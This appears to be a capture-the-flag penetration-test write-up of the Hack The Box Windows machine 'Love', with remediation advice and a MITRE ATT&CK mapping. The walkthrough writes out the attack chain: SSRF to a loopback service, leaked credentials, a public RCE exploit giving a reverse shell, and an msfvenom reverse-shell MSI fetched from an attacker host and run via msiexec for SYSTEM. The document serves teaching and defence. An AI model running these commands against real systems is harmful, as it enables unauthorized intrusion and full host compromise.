# Penetration Test Report — Love

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-SSRF%20%2F%20AlwaysInstallElevated-red)

## Executive Summary

An authorized assessment of `target.htb` identified a Server-Side Request Forgery (SSRF) vulnerability in a staging file-scanner application, which exposed an internal service on port 5000 and leaked admin credentials for a Voting System application. A known authenticated RCE in the Voting System provided a foothold as user `phoebe`. The host was then fully compromised by combining the **AlwaysInstallElevated** misconfiguration with an AppLocker policy gap to install a malicious MSI as SYSTEM.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | SSRF in staging file-scanner → internal service disclosure & credential leak | High |
| 2 | Authenticated RCE in Voting System application | High |
| 3 | AlwaysInstallElevated enabled (HKLM + HKCU) | Critical |
| 4 | AppLocker policy permitting MSI execution from a user-writable directory | High |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV target.htb
```

Apache, SMB, MySQL, and an unknown service on port 5000. TLS certificate on 443 leaked the vhosts:

```bash
echo "target.htb www.love.htb staging.love.htb" >> /etc/hosts
```

- `www.love.htb` — a **Voting System** app with a known *authenticated* RCE (but no registration possible).
- `staging.love.htb` — a **File Scanner** (beta) app accepting a URL to scan.
- `www.love.htb:5000` — "You don't have permission to access this resource" (internal only).

### 2. SSRF → Credential Leak

The scanner fetched attacker-supplied URLs server-side. Supplying the loopback address bypassed the restriction on port 5000:

```
http://127.0.0.1:5000/
```

This exposed an internal password manager and disclosed credentials:

```
admin : @LoveIsInTheAir!!!!
```

### 3. Foothold — Authenticated RCE (Voting System)

The public exploit for the Voting System was configured with the recovered credentials:

```python
IP       = "www.love.htb"
USERNAME = "admin"
PASSWORD = "@LoveIsInTheAir!!!!"
REV_IP   = "<attacker-ip>"
REV_PORT = "8888"
```

```bash
nc -lvnp 8888
python3 49445.py
```

Reverse shell obtained as `phoebe`.

### 4. Privilege Escalation — AlwaysInstallElevated + AppLocker Bypass

Registry check confirmed the misconfiguration:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

A direct `msiexec` run was blocked, so the effective AppLocker policy was reviewed:

```powershell
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```

The policy permitted MSI installs from `C:\Administration` for `phoebe`. A malicious MSI was generated and executed from the allowed path:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o reverse.msi
python3 -m http.server
rlwrap nc -lvnp 4444
```

```powershell
wget http://<attacker-ip>:8000/reverse.msi -o reverse.msi
# from C:\Administration
msiexec /quiet /i reverse.msi
```

Result: reverse shell as `NT AUTHORITY\SYSTEM`.

## Remediation

- Sanitize/allowlist URLs in server-side fetchers; block loopback and internal ranges (SSRF).
- Do not expose staging/beta applications publicly; rotate leaked credentials.
- Disable **AlwaysInstallElevated** on both HKLM and HKCU hives.
- Tighten AppLocker: remove user-writable paths from allow rules and enforce MSI publisher rules.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application (SSRF) |
| Execution | T1059 — Command & Scripting Interpreter |
| Privilege Escalation | T1548.002 — Bypass UAC / Abuse Elevation Control (AlwaysInstallElevated) |
| Defense Evasion | T1218 — System Binary Proxy Execution (msiexec) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
